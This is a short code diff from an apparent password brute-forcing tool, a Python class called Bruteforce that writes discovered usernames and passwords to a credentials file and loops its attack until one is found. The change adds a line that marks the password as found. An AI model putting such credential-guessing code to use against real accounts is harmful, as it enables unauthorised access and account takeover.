@@ -103,6 +103,7 @@ class Bruteforce(Spyder):
  def save_cred(self, pwd):
    creds = 'Username: {}\nPassword: {}\n\n'.format(self.username, pwd)
    with open(credentials, 'a') as f:f.write(creds)
+   self.is_found = True
 
  def attack(self):
   while all([not self.is_found, self.is_alive]):
